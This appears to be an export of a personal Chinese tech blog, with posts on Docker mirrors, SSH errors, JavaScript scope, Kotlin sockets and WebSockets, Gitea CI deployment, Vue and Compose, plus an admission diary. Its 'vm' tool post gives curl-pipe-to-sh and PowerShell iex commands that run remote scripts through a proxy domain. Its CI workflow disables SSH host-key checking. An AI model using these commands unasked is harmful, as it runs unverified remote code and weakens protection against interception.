vi /etc/docker/daemon.json# 内容如下：&#123;  &quot;registry-mirrors&quot;: [    &quot;https://xx4bwyg2.mirror.aliyuncs.com&quot;,    &quot;http://f1361db2.m.daocloud.io&quot;,    &quot;https://registry.docker-cn.com&quot;,    &quot;http://hub-mirror.c.163.com&quot;,    &quot;https://docker.mirrors.ustc.edu.cn&quot;,    &quot;你自己的镜像地址&quot;  ]&#125;# 退出并保存:wq# 使配置生效systemctl daemon-reload# 重启Dockersystemctl restart docker

就完成了镜像源的配置了
]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>win下ssh连接报错被修改</title>
    <url>/posts/6ceb97f0/</url>
    <content><![CDATA[删除旧ssh密钥[user@hostname ~]$ ssh root@pong@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!Someone could be eavesdropping on you right now (man-in-the-middle attack)!It is also possible that a host key has just been changed.The fingerprint for the RSA key sent by the remote host is6e:45:f9:a8:af:38:3d:a1:a5:c7:76:1d:02:f8:77:00.Please contact your system administrator.Add correct host key in /home/hostname /.ssh/known_hosts to get rid of this message.Offending RSA key in /var/lib/sss/pubconf/known_hosts:4RSA host key for pong has changed and you have requested strict checking.Host key verification failed.

通常这种问题出现在你常连接到一个主机设备被物理重置或者重装系统，导致主机的密钥发生变化，而你的本地计算机还保留着旧的密钥，所以会报错。
这时你只需要删除掉本来的密钥即可。
ssh-keygen -R &lt;host&gt;]]></content>
      <categories>
        <category>windows</category>
      </categories>
  </entry>
  <entry>
    <title>作用域链与变量声明</title>
    <url>/posts/27088d89/</url>
    <content><![CDATA[作用域及作用链
全局作用域；
函数作用域；
块级作用域；

全局作用域全局作用域的变量可以在程序任意位置访问到。
var greeting = &#x27;Hello World!&#x27;;function greet() &#123;  console.log(greeting);&#125;// 打印 &#x27;Hello World!&#x27;greet();
函数作用域函数作用域也叫局部作用域，如果一个变量是在函数内部声明的它就在一个函数作用域下面。这些变量只能在函数内部访问，不能在函数以外去访问。
块级作用域ES6引入了let和const关键字,和var关键字不同，在大括号中使用let和const声明的变量存在于块级作用域中.在大括号之外不能访问这些变量。
&#123;  // 块级作用域中的变量  let greeting = &#x27;Hello World!&#x27;;  var lang = &#x27;English&#x27;;  console.log(greeting); // Prints &#x27;Hello World!&#x27;&#125;// 变量 &#x27;English&#x27;console.log(lang);// 报错：Uncaught ReferenceError: greeting is not definedconsole.log(greeting);
错误示例var a = 0;   function b(c)&#123;       console.log(a);//undefined       var a= 1;       arguments[0] = 2;       console.log(c);//2       console.log(a);//1   &#125;   b(3);   console.log(a);//0      //请问第一个为何是undefined呢？var a = 0：不是全局定义并赋值了嘛？求解
正确解答：你把函数里面的 var a 写在 console.log(a);的前面就应该有了。你注意下js代码的执行顺序，先声明后执行，此外他会优先在当前的作用域里面找。 上面的代码执行顺序是这样的 1，var a ；2，声明个函数 b;3,执行赋值 a &#x3D;0；4,调用 b(3),进入 函数 b里面执行，这个时候 又会在 b函数里面 开辟内存空间，同样的也是 先声明后执行从上往下，里面的进程是这样的。1，声明 c; 2,声明 a 然后开始执行 c &#x3D;3 ，在执行 console.log(a);这里注意 a在b函数里面已经声明了，所以他不会去外面找。而里面的这个a 只是 声明了 没有赋值 当时 会报 undefined。后面就不说了。
]]></content>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>使用github.dev写博客</title>
    <url>/posts/b5d9fc79/</url>
    <content><![CDATA[新的体验原本使用的博客系统是typecho，现在迁移到hexo来进行编写。如果说非要有什么理由的话，可能是因为服务器要到期了。到时候需要对typecho的配置进行迁移。（主要是服务器多了个php环境。而我刚好不太会php）索性迁移到hexo。进行新博客的书写。同时我也会将我的域名zfxt.top迁移过来。优缺点比较：    他们都可以设置一样的主题，一样的好看。甚至说是一摸一样。typecho胜在。

可以在线编辑，因为他部署在服务器上，有着admin管理环境，也有单独的数据库。我可以很轻松的在不同的地方，不同的网络。随时随地编写我的博客。

同样他也有一个很方便的地方就是对于图片的上传。他只需要复制，粘贴，便会自动保存到服务器中，然后自动生成对应的markdown代码。我不用考虑图床或者其他的图片保存问题。

他同时也是个很轻量化的应用，占用内存等都比较小 .


而hexo直接就是静态代码。

他没有数据库，所有的信息都是通过md文件保存，这样最大的好处就是很容易迁移，到处迁移，不用担心数据库的结构问题。
同时他也可以轻松的和github一起使用。通过github page直接实现无服务器运行。
缺点就是他没有很方便的图床管理功能和在线编写功能，大部分情况都得本地编写，然后再部署到github上。
作为js写的项目，他当然会更加适用于前端，我也能看懂大部分代码

而现在我再考虑的是，使用github.dev和七牛云，来实现更轻便的部署方案（主要是因为我 搞github action搞不太明白。卡报错，网上教程也少，所以就是这样）你现在看到的就是我用github.dev来写博客那么就先到此为止吧
]]></content>
      <tags>
        <tag>github</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Kotlin构建WebSocket服务器模板</title>
    <url>/posts/68fef8ae/</url>
    <content><![CDATA[记录一个使用kotlin写WebSocket的常用模板
package top.zfxt.chat.serviceimport cn.hutool.json.JSONArrayimport cn.hutool.json.JSONObjectimport cn.hutool.json.JSONUtilimport jakarta.websocket.*import jakarta.websocket.server.PathParamimport jakarta.websocket.server.ServerEndpointimport org.slf4j.LoggerFactoryimport org.springframework.stereotype.Controllerimport org.springframework.stereotype.Serviceimport top.zfxt.chat.pojo.Userimport java.nio.ByteBufferimport java.util.*import java.util.concurrent.ConcurrentHashMap/** *  @author:zfxt *  @version:1.0 */@Service@ServerEndpoint(&quot;/chat/&#123;username&#125;&quot;)class WebSocketServer &#123;    companion object&#123;          val UsersMap:MutableMap&lt;String, User?&gt; = mutableMapOf()          val log = LoggerFactory.getLogger(WebSocketServer.javaClass)        /**         * 记录当前在线人数         */         val sessionMap:MutableMap&lt;String,Session&gt; = ConcurrentHashMap();    &#125;    /**     * 建立成功调用的方法     */    @OnOpen    public fun onOpen(session:Session,@PathParam(&quot;username&quot;) username:String)&#123;        //让用户上线        var newUser: User? = UsersMap.get(username)        newUser?.status = &quot;online&quot;        if(newUser==null)        &#123;            //生成用户信息            var userId = UUID.randomUUID().toString().replace(&quot;-&quot;,&quot;&quot;).substring(0,10)            newUser = User(userId,username,null,&quot;online&quot;)        &#125;            UsersMap.put(username,newUser)            sessionMap.put(username,session)            log.info(&quot;有新用户加入，username=&#123;&#125;，当前在线人数为：&#123;&#125;&quot;,username, sessionMap.size)        var systemMessage = JSONObject().set(&quot;isSystem&quot;,true).set(&quot;users&quot;, UsersMap.values)        sendAllMessage(JSONUtil.toJsonStr(systemMessage))//        var result: JSONObject = JSONObject()//        var array: JSONArray = JSONArray()//        result.set(&quot;users&quot;,array)//        for (key in sessionMap.keys)&#123;//            array.add(JSONObject().set(&quot;username&quot;,key))//        &#125;//        sendAllMessage(JSONUtil.toJsonStr(result))    &#125;    /**     * 连接关闭调用的方法     */    @OnClose    public fun onClose(session: Session,@PathParam(&quot;username&quot;) username: String)&#123;        sessionMap.remove(username)        UsersMap.remove(username)        log.info(&quot;有一连接关闭，移除username=&#123;&#125;的用户session，当前在线人数为：&#123;&#125;&quot;,username, sessionMap.size)        var systemMessage = JSONObject().set(&quot;isSystem&quot;,true).set(&quot;users&quot;, UsersMap.values)        sendAllMessage(JSONUtil.toJsonStr(systemMessage))    &#125;    /**     * 收到客户端消息后调用的方法     *     * @param message 客户端发送过来的消息     */    @OnMessage(maxMessageSize = 1024*1024*10)    public fun onMessage(message: String,@PathParam(&quot;username&quot;) username: String)&#123;        log.info(&quot;服务器收到用户username=&#123;&#125;的消息:&#123;&#125;&quot;,username,message)        var obj = JSONUtil.parseObj(message)        var fromname = obj.getStr(&quot;from&quot;)        var toUsername = obj.getStr(&quot;to&quot;)        var toSession = sessionMap.get(toUsername)        if(toSession != null)&#123;            var message = JSONObject().set(&quot;isSystem&quot;,false).set(&quot;message&quot;,obj).toString()            sendMassage(message,toSession)            log.info(&quot;用户&#123;&#125;发送给用户username=&#123;&#125;，消息：&#123;&#125;&quot;,fromname,toUsername,message)        &#125;else&#123;            log.info(&quot;发送失败，未找到用户username=&#123;&#125;的session&quot;,toUsername)            UsersMap.remove(toUsername)        &#125;    &#125;    @OnError    public fun onError(session: Session,error:Throwable)&#123;        log.error(&quot;发生错误&quot;)        error.printStackTrace()    &#125;    /**     * 服务器发送消息给客户端     */    private fun sendMassage(message:String,toSession: Session)&#123;        try &#123;            log.info(&quot;服务器给客户端[&#123;&#125;]发送消息&#123;&#125;&quot;,toSession.id,message)            toSession.basicRemote.sendText(message)        &#125;catch (e:Exception)&#123;            log.error(&quot;服务器发送消息给客户端失败&quot;,e)        &#125;    &#125;    /**     * 服务器发送图片给客户端     */    private fun sendImage(image:ByteBuffer,toSession: Session)&#123;        toSession.basicRemote.sendBinary(image)    &#125;    /**     * 服务器发送消息给所有客户端     */    private fun sendAllMessage(message:String)&#123;        try &#123;            for(session in sessionMap.values)&#123;                log.info(&quot;服务端给客户端[&#123;&#125;]发送消息&#123;&#125;&quot;,session.id,message)                session.basicRemote.sendText(message)            &#125;        &#125;catch (e:Exception)&#123;            log.error(&quot;服务器发送消息给客户端失败&quot;,e)        &#125;    &#125;&#125;]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>WebSocket</tag>
      </tags>
  </entry>
  <entry>
    <title>使用gitea action实现CICD</title>
    <url>/posts/f5d3f52f/</url>
    <content><![CDATA[CICDCI&#x2F;CD 是持续集成和持续交付&#x2F;部署的缩写，旨在简化并加快软件开发生命周期。
持续集成（CI）是指自动且频繁地将代码更改集成到共享源代码存储库中的做法。持续交付和&#x2F;或持续部署（CD）是一个由两部分组成的过程，涉及代码更改的集成、测试和交付。持续交付不会自动部署到生产环境，持续部署则会自动将更新发布到生产环境。
简单来说，就是我们将代码提交到远程仓库后，自动化服务会替我们完成测试交付和部署的功能。
常用的CICD工具在本文中我将演示使用gitea actions实现hexo的自动部署功能。
正片开始正如其名，其实gitea和github actions的功能几乎一致，就是沿用下来了而已。在我们的操作过程中，主要有三步：

使用docker启动一个act_runner，作为action的服务器
配置deploy.yml实现推送时，自动部署到服务器
使用nginx展示部署后的页面

安装act_runner打开gitea的官方文档可以查阅关于act_runner的配置信息
注册runner在运行Act Runner之前，需要进行注册，因为Runner需要知道从哪里获取Job，并且对于Gitea实例来说，识别Runner也很重要。
Runner级别您可以在不同级别上注册Runner，它可以是：
实例级别：Runner将为实例中的所有存储库运行Job。组织级别：Runner将为组织中的所有存储库运行Job。存储库级别：Runner将为其所属的存储库运行Job。请注意，即使存储库具有自己的存储库级别Runner，它仍然可以使用实例级别或组织级别Runner。未来的版本可能提供更多对此进行更好控制的选项。
获取注册令牌Runner级别决定了从哪里获取注册令牌。
实例级别：管理员设置页面，例如 &lt;your_gitea.com&gt;/admin/actions/runners。组织级别：组织设置页面，例如 &lt;your_gitea.com&gt;/&lt;org&gt;/settings/actions/runners。存储库级别：存储库设置页面，例如 &lt;your_gitea.com&gt;/&lt;owner&gt;/&lt;repo&gt;/settings/actions/runners。
启动runner我这里直接使用docker compose启动一个。
version: &quot;3.8&quot;services:  runner:    image: gitea/act_runner:latest    container_name: act_runner    environment:      CONFIG_FILE: /config.yaml      GITEA_INSTANCE_URL: &quot;$&#123;INSTANCE_URL&#125;&quot;      GITEA_RUNNER_REGISTRATION_TOKEN: &quot;$&#123;REGISTRATION_TOKEN&#125;&quot;      GITEA_RUNNER_NAME: &quot;$&#123;RUNNER_NAME&#125;&quot;      GITEA_RUNNER_LABELS: &quot;$&#123;RUNNER_LABELS&#125;&quot;    volumes:      - ./config.yaml:/config.yaml      - ./data:/data      - /var/run/docker.sock:/var/run/docker.sock    restart: always

然后你就可以看到你这边已经存在了一个全局的runner可以提供使用了
添加配置文件在你的仓库下面创建一个.gitea/workflows的文件夹。在文件夹下任意创建一个yml配置文件，如下所示：具体代码如下：
name: Deploy Hexo Blogon:  push:    branches:      - main  # 或你希望触发部署的分支jobs:  deploy:    runs-on: ubuntu-latest    steps:      - name: Checkout Code        uses: actions/checkout@v2      - name: Setup Node.js        uses: actions/setup-node@v2        with:          node-version: &#x27;16&#x27;  # 请根据你的需求选择 Node.js 版本      - name: Install Dependencies        run: |          npm install          npm install hexo-cli -g                - name: Build Hexo        run: hexo generate      - name: Deploy to Server        env:          SSH_PRIVATE_KEY: $&#123;&#123; secrets.SSH_PRIVATE_KEY &#125;&#125;          SERVER_USER: $&#123;&#123; secrets.SERVER_USER &#125;&#125;          SERVER_HOST: $&#123;&#123; secrets.SERVER_HOST &#125;&#125;          SERVER_PATH: $&#123;&#123; secrets.SERVER_PATH &#125;&#125;        run: |          # 设置 SSH 密钥          mkdir -p ~/.ssh          echo &quot;$SSH_PRIVATE_KEY&quot; &gt; ~/.ssh/id_rsa          chmod 600 ~/.ssh/id_rsa          # 使用 scp 将 public 目录推送到服务器指定路径          scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r ./public/* $SERVER_USER@$SERVER_HOST:$SERVER_PATH          # 如果你需要删除多余的文件，可以在此添加其他命令来清理旧的内容          ssh -o StrictHostKeyChecking=no $SERVER_USER@$SERVER_HOST &lt;&lt;EOF            # 进入服务器指定目录            cd $SERVER_PATH            # 可以在此进行其他操作，如清理过时的文件或配置            echo &quot;Deployment complete&quot;          EOF          

上述代码基本与github actions的语法一致，这里不提供相关的基础概念了。想学习的可以查阅github的官网。(大部分情况下可以通过gpt等ai生成一个样例模板，再自己去写所需要的部分)
上面代码中个别细节需要提及：

secrets.SSH_PRIVATE_KEY等密钥配置文件是保存在仓库的如下选项中 这与github中的配置也是相似的 
StrictHostKeyChecking=no用于关闭交互服务(一般使用ssh密钥连接时都是交互式会提示是否接受等概念) 

nginx页面展示也就是你所看到的博客页面啦。这些都是我通过nginx展示出来的。不过关于nginx的具体代码配置我就不在此展开了。我应该会有另外的文章去说明这部分内容。
]]></content>
      <categories>
        <category>本地化服务</category>
      </categories>
      <tags>
        <tag>gitea</tag>
        <tag>CICD</tag>
      </tags>
  </entry>
  <entry>
    <title>使用socket实现一个小型的聊天程序</title>
    <url>/posts/98ed18eb/</url>
    <content><![CDATA[最近在学习使用kotlin，然后试了试用socket实现一个聊天通信功能。然后发现其实kotlin用的很多库都是JAVA中已经存在的。所以更好的使用kotlin不仅要明白kotlin相对于java的优秀特性和他的跨平台能力，还需要对java也有深度的理解。
使用的插件和包:在build.gradle.kts配置文件中配置你所需要的插件和依赖。

插件

plugins &#123;	···    id(&quot;com.github.johnrengelman.shadow&quot;) version &quot;8.1.1&quot;	···&#125;tasks.withType&lt;ShadowJar&gt; &#123;	archiveBaseName.set(&quot;myapp&quot;)  // jar 文件的基本名字	archiveVersion.set(&quot;1.0.0&quot;)  // jar 文件的版本号	archiveClassifier.set(&quot;&quot;)  // jar 文件的额外标签，这里设为空	manifest &#123;		attributes[&quot;Main-Class&quot;] = &quot;top.zfxt.demo.DemoApplicationKt&quot; // 设置主类	&#125;&#125;
这个shadowJar插件可以编写的帮你打包你的项目所需要的所有依赖。同时你也可以自己编辑那个是主类，以及不包括那些类，和打包后的名字。

相比于spring自带的bootjar。当你不使用spring时，可能会遇到相关的打包失败问题：如“无法找到主元素清单”等。因此这个插件可以很好的帮助你完成jar包的一键配置


依赖dependencies &#123;    testImplementation(kotlin(&quot;test&quot;))    implementation(&quot;org.jetbrains.kotlinx:kotlinx-coroutines-core:1.7.1&quot;)    // https://mvnrepository.com/artifact/cn.hutool/hutool-json    implementation(&quot;cn.hutool:hutool-json:5.8.20&quot;)&#125;
这里用到了kotlin的协程库和hutool的json序列化工具。因为我们的聊天程序是可以多用户一起聊天的，所以需要用到多线程，让每个socket连接都可以单独运作。而json序列化则方便将具体类两边传输后，可以方便的获取其中的元素。

client
主程序fun main(): Unit = runBlocking &#123;    login()    checkInit()    var job = GlobalScope.launch &#123; withContext(Dispatchers.IO) &#123; handleServer() &#125; &#125;    launch &#123; withContext(Dispatchers.IO) &#123; view(job) &#125; &#125;&#125;
其中使用withContext(Dispatchers.IO)方法从线程池里拉起一个新的线程，各线程可以相互独立运行。之间不会相互影响。全局定义一个变量，
login()方法与socket服务器进行连接，并将输入输出流存储到client单例中。
checkInit()用于完成连接后，需要输入一个昵称用作聊天，这个昵称将会被发送到服务器并进行存储，同时也会把这昵称保存在client的单例中。
handleServer()循环接受来自服务器的输入流，如果没有读取到的话，就会阻塞，知道接收到消息才开始启动。
view()用于显示主体界面，用于输入命令，显示框架。

serverfun main(): Unit = runBlocking &#123;    println(&quot;服务器已经开启&quot;)    launch &#123;        while (true) &#123;            server.apply &#123;                println(&quot;等待连接&quot;)                val client = withContext(Dispatchers.IO) &#123; server.serversocket.accept() &#125;                //使用了 Dispatchers.IO 调度器，将 accept() 操作放在了 IO 线程池中进行，从而避免了阻塞当前的协程。                println(&quot;有新用户连接&quot;)                launch &#123;                    withContext(Dispatchers.IO) &#123; handleClient(client) &#125;                &#125;             &#125;        &#125;    &#125;&#125;
他拉起了一个协程，并在协程中拉起一个线程，用于时刻等待是否有新的客户端进行，如果有就接受，并且将这个socket拉起一个新线程并且保持运行。

handleClient(client)用于接受客户端的命令，并且保持阻塞状态等待命令的发送。

探究细节
协程与线程的区别协程与线程主要区别是它将不再被内核调度，而是交给了程序自己而线程是将自己交给内核调度定义：协程是轻量级线程。 在一个用户线程上可以跑多个协程，这样就提高了单核的利用率。优点：协程占用的资源更少，切换协程时，所需要进行更替而交换的上下文也更少，可以提高单核的利用率。缺点：协程是处于一个线程中，系统是无感知的，所以需要在该线程中阻塞某个协程的话，就需要手工进行调度。就我目前的知识储备，对于会阻塞的程序，我只能通过调用多线程的方法实现例如，在程序中，kotlin提供了从线程池中获取一个线程的方法withContext(Dispatchers.IO)&#123;执行程序&#125;,因为输入流的readLine()，serversocket的accept()方法都是阻塞的，如果使用协程运行他们的话，他们会直接阻塞住所有的程序，所以我在客户端和服务端都选择用withContext(Dispatchers.IO)去拉起一个新线程。
输入流和输出流的接受和阻塞在socket通信中，输入流和输出流都会一致保持开启状态，如果关闭了输入输出流，就会无法重新打开，只能重新启动一个socket连接。而当你进行文字传输时，常用的的方式是使用bufferwriter进行读写操作，kotlin通过扩展函数的方法实现便携的把字节输入输出流转化为缓冲字符输入输出流。


如果使用bufferreader的readLine方法进行读取操作，那么他需要接受到一个\n以判断读入结束，然后他就会把读入到的内容存到变量中。否则他就会一直读入，处于阻塞状态。这就是为什么我的很多次写入操作都手动加入了”\n”用来表示结束读入符。
如果你读入文件时，常用的读取方法是while (inputStream.read(buffer).also &#123; bytesRead = it &#125; != -1) &#123;    // 处理读取到的字节块&#125;
可是这样子的判断方法是只适用于读取完之后，直接关闭输入输出流，才会读到-1。所以这里可以使用其他的方法，比如说，提前获取他能读取的最大读入值，available()方法可以用于获取可能读取到的最大字节数。你可以通过这个提前获取最大量，然后按量读取，读取完后就结束。例如我程序中的操作：do &#123;    var len: Int = client.input.read(bytes)    if (len != -1) &#123;        it.write(bytes, 0, len)        i += len        println(&quot;已完成$&#123;i * 1.0 / fileSize&#125;&quot;)    &#125;&#125; while (len != -1 &amp;&amp; i &lt; fileSize)
我这里的操作是类似的，通过先确定文件大小fileSize的方式来读取，当读入完成后就结束。但是，有一些问题需要提及在 Java 和 Kotlin 中，available() 方法返回的是输入流中当前可读取的字节数量，而不是限制字节数量的大小。然而，需要注意的是，available() 方法的返回值并不一定代表整个输入流中的可用字节数量，也不保证一次读取就能读取到该数量的字节。它只是表示当前时刻下可以无阻塞地读取的字节数。所以我在程序中，事先把文件大小发过去的。
我这里的操作是因为我用的是字节数组读入的方法。如果你使用一个字节一个字节的读入。那么你也可以设置一个结束的关键词，就像readLine()一样用来结束输入。


粘包问题如果两次写入socket流时间太接近，他可能会连着一起发送，导致数据无法正确接受。这也就是我在源码中多次使用delay()方法延迟接收的原因。


项目代码在github仓库中，客户端,服务端

]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>socket</tag>
        <tag>底层源码</tag>
      </tags>
  </entry>
  <entry>
    <title>下一站，上岸</title>
    <url>/posts/10614fa3/</url>
    <content><![CDATA[
今天是4月10日，距离我得知自己拟录取已经过了一周了。公示期也过去了。我也总算可以好好装个逼了。哈哈哈哈

心得体会该以什么开头呢，一战成硕？不过些许风霜罢了？还是说，终于熬出头了？似乎无论哪种说辞都无法阐述我内心的奇怪感觉，这与我12月份当时的感觉有些不同1。
好像一切都很凑巧，生活很惬意，对结果也很随意。没有很强硬的目的，却获得了还不错的结果。或许我应当在此先报个喜。是的，我从双非考到211了，暨南大学。
……说些什么好呢，我自认为已经和我认为重要的人都分享过我的喜悦了。所以，当我放下手机那一刻。我竟有些过于平静：恍惚间，大学四年竟然已经过去了。好吧，那我们先就此打住，或许是乐极生悲。我实在是不知道讲什么了。那接下来我就说说从4.3到4.10这几天我的感受吧。
(删减一大部分内容)
经验分享上面的话结束了，那接下来就是正题了。嘿嘿，逆袭上岸！暨大1：2的复试比，招38个人，我排63，经过复试后，我排到了第19名，成功的逆袭上岸了。嚯哈哈哈哈。我可真牛逼啊！
我的专业代码是计算机技术(085404),考的是222408.当然，逆袭上岸并不是一蹴而就的，在复试准备期间我也付出了很多的努力。下面我将分享一下我的一些经验和心得。
学校特色首先，暨大很公平！不歧视双非，而且复试和初始占比各50%，换句话说，只要你能通过初试进入复试名单。你就和别人站在了一条新的起跑线上，复试的分值占比远大于初试，复试的一分可以抵初试的2.5分。所以，无论你是在初试中垫底，亦或者在初始中排名很高。都应当重视这场复试。排后面的，在复试上多花功夫，你一定可以逆袭上岸。排在前面的，也别掉以轻心，因为一稍不注意就可能会被别人反超。
然后，关于如何复试，我不知道我会不会说漏嘴，会不会涉及到保密的内容。所以只说一些网上大家都比较直观能看到的，做一个比较清晰的汇总。

得机试者得天下。在往年都有机试的部分，也有大佬将往年的机试题目汇总了下来，该网站。大家可以参考一下。一般把这些题目全部搞明白之后，机试也就难不倒你了。
笔试的话，你再把自己初试学过的408知识重新过一遍，应该也就没有大碍了。
关于面试，我只能说我考前真的准备了很多。因为只有这个部分是不确定的。其他的机试笔试就像是一个坑摆在那里，你只要把坑填了就好了。 而面试具有太多的不确定性，反而你要准备的东西是最多的。 我给你们看看我当时的准备清单：  不敢说我准备的有多充足吧，反正比初试准备的多的多，哈哈哈。初试我一点儿不紧张，复试就难太多了。
然后就是最重要的，保持轻松和自信！！！

只要你自信，那么面试时就不会紧张，一切问题都将会迎刃而解。加油！！！你们也一定可以的！最后送各位一句话：
黎明之前最黑暗，放弃就是大傻蛋。
]]></content>
      <categories>
        <category>上岸</category>
      </categories>
  </entry>
  <entry>
    <title>全局事件总线实现</title>
    <url>/posts/eec3b6c0/</url>
    <content><![CDATA[全局事件总线

初步想法，维系一个全局可以获得的变量，可以直接在main.js中定义一个window.x=&#123;name:hzt&#125;，然后全局都可以通过window.x获得该元素。
进一步思考，让所有的vc可以访问到该元素，可以在VueComponent.prototype上放属性。但是VueComponent必须为Vue.extend调用生成，而且他一定是新生成的VueComponent。或者直接进入源码修改

一个很重要的内置关系VueComponent.prototype._proto_ === Vue.prototype3. 因此可以在Vue.prototype中引入全局事件总线。4. 这里任然没有解决问题，因为只有一个vc或者vm实例对象才可以使用$on,$emit，因此要加一个vc，或者vm，或者直接绑定最大的父亲vm.prototype.$bus
last(最终写法）在main.js中
//创建vmnew Vue(&#123;  el:&#x27;#app&#x27;,  render: h =&gt; h(App),  beforeCreate() &#123;    Vue.prototype.$bus = this //安装全局事件总线  &#125;,&#125;)
然后vm中的x即可作为一个全局变量来使用了因为每个自定义事件只能绑定一个方法，因此为了避免一直占用着一个事件。要求在组件销毁前先解绑
beforeDestroy()&#123;  this.$bus.$off(&#x27;hello&#x27;)&#125;]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>关于compose的主题配色</title>
    <url>/posts/3b247948/</url>
    <content><![CDATA[这篇文章主要是两点:
compose的日夜间模式在使用jetpack compose时,我们最开始写每个页面时,往往不会注意他的配色问题,通常都是选择将每个颜色都固定.可是这就会导致一个问题.日夜间模式切换后,不会有任何变化,这就让夜间使用者体验很差.因此需要了解这一方面的问题:
默认主题jetpack Compose是符合Material Design3的规范的.因此我们很多东西都可以遵循其特点,来实现最好的开发方式.
在Theme.kt里,我们可以看到如下代码:
private val DarkColorScheme = darkColorScheme(    primary = Purple80,    secondary = PurpleGrey80,    tertiary = Pink80,    background = Color(0xFF030303),    onBackground = Color(0xFF25273D),    onTertiary = Color.White)private val LightColorScheme = lightColorScheme(    primary = Purple40,    secondary = PurpleGrey40,    tertiary = Pink40,    background = Color(0xFFFFFBFE),    onBackground = Color.White,    onTertiary = Color.Black    /* Other default colors to override    background = Color(0xFFFFFBFE),    surface = Color(0xFFFFFBFE),    onPrimary = Color.White,    onSecondary = Color.White,    onTertiary = Color.White,    onBackground = Color(0xFF1C1B1F),    onSurface = Color(0xFF1C1B1F),    */)var isDarkTheme by mutableStateOf(false)@Composablefun TodoListTheme(    darkTheme: Boolean = isSystemInDarkTheme(),    // Dynamic color is available on Android 12+    dynamicColor: Boolean = false,    content: @Composable () -&gt; Unit) &#123;...&#125;

在这段代码里,isSystemInDarkTheme()是android自带的一个判断是否是夜间模式的方法,当他判断是夜间模式时,会选用上面的LightColorScheme或者DarkColorScheme,然后根据这些主题的配色自动选择他的颜色,你也可以手动选择就像这种.
当你遵循Material Design的设计后,在你选择切换夜间模式的时候,他的主题颜色也会随之变更
更详细的内容可以看这个官方网站https://developer.android.com/codelabs/jetpack-compose-theming?hl=zh-cn#0他也有推荐的主题适配工具https://m3.material.io/theme-builder#/custom
配置其他类型的主题就是手动切换主题他的大概思路就是:

构建一个枚举类,设计多个不同的主题样式

修改这段代码
 val colorScheme = when &#123;    dynamicColor &amp;&amp; Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.S -&gt; &#123;        val context = LocalContext.current        if (darkTheme) dynamicDarkColorScheme(context) else dynamicLightColorScheme(context)    &#125;    darkTheme -&gt; DarkColorScheme    else -&gt; LightColorScheme&#125;

 将其增多几个选项,可以通过我们手动切换主题样式

将选择的主题存储在数据库或者一些其他的持久性存储中.

切换主题即可



引用自https://juejin.cn/post/7070671629713408031#heading-4

]]></content>
      <tags>
        <tag>android</tag>
        <tag>compose</tag>
        <tag>主题配色</tag>
      </tags>
  </entry>
  <entry>
    <title>全新的多工具多平台管理工具vm</title>
    <url>/posts/3bed842d/</url>
    <content><![CDATA[安利这个https://github.com/gvcgo/version-manager这是我最近刚体验到的一个新的多版本管理工具,怎么说,还在开发中,有些小问题正在解决,但是他的简洁程度和多版本整合让我感到非常惬意.
安装过程
for MacOS&#x2F;Linux(复制下面的命令到terminal执行即可)
  curl --proto &#x27;=https&#x27; --tlsv1.2 -sSf https://gvc.1710717.xyz/proxy/https://raw.githubusercontent.com/gvcgo/version-manager/main/scripts/install.sh | sh

for Windows(复制下面的命令到powershell中执行即可)
  powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString(&#x27;https://gvc.1710717.xyz/proxy/https://raw.githubusercontent.com/gvcgo/version-manager/main/scripts/install.ps1&#x27;)&quot;

手动安装(当你的系统下载脚本出现问题时，可以选择手动安装)
  1. 从release页面下载对应的版本；2. 解压，打开终端或者Powershell，执行命令&quot;vm is&quot;，即可安装。


vm和vfox支持列表对比(这里真的太棒了,兼容了我所有需要使用的工具)



sdk
vm
vfox



java(jdk)
✅︎
✅︎


maven
✅︎
✅︎


gradle
✅︎
✅︎


kotlin
✅︎
✅︎


scala
✅︎
✅︎


groovy
✅︎
✅︎


python
✅︎
✅︎


pypy
✅︎
❌︎


miniconda
✅︎
❌︎


go
✅︎
✅︎


node
✅︎
✅︎


deno
✅︎
✅︎


bun
✅︎
❌︎


flutter(dart)
✅︎
✅︎


.net
✅︎
✅︎


zig
✅︎
✅︎


zls
✅︎
❌︎


php
✅︎
✅︎


rust
✅︎
❌︎


cmdline-tool(android)
✅︎
❌︎


vlang
✅︎
❌︎


v-analyzer
✅︎
❌︎


cygwin-installer
✅︎
❌︎


msys2-installer
✅︎
❌︎


julia
✅︎
❌︎


typst
✅︎
❌︎


typst-lsp
✅︎
❌︎


typst-preview
✅︎
❌︎


gleam
✅︎
❌︎


git-for-windows
✅︎
❌︎


neovim
✅︎
❌︎


vscode
✅︎
❌︎


protobuf(protoc)
✅︎
❌︎


lazygit
✅︎
❌︎


kubectl
✅︎
❌︎


acast(asciinema)
✅︎
❌︎


erlang(需要编译)
❌︎
✅︎


elixir(需要编译)
❌︎
✅︎



如何设置代理?代理或者反向代理任选其一进行设置，reverse-proxy由vm免费提供。对于github下载较慢或者失败的情况，你应该用得到。

设置代理
  vm set-proxy &lt;http://localhost:port or socks5://localhost:port&gt;

设置免费的反向代理
  # reverse proxy &lt;https://gvc.1710717.xyz/proxy/&gt; is available for free.vm set-reverse-proxy https://gvc.1710717.xyz/proxy/

使用国内镜像资源网站进行下载，对于部分有国内镜像的应用有效.
  vm use -mirror-in-china go@1.22.1


子命令介绍


子命令
参数
功能



list
-
显示支持的sdk列表(列表操作：j&#x2F;k翻动列表，q退出)


search
sdk-name
显示该sdk支持的版本列表


use
sdk-name@version
安装&#x2F;切换sdk到指定版本


local
sdk-name
显示sdk在本地已安装的版本


uninstall
sdk-name@version or sdk-name@all
卸载某个版本或者卸载所有版本


clear-cache
sdk-name
清除本地已缓存的压缩文件


set-reverse-proxy
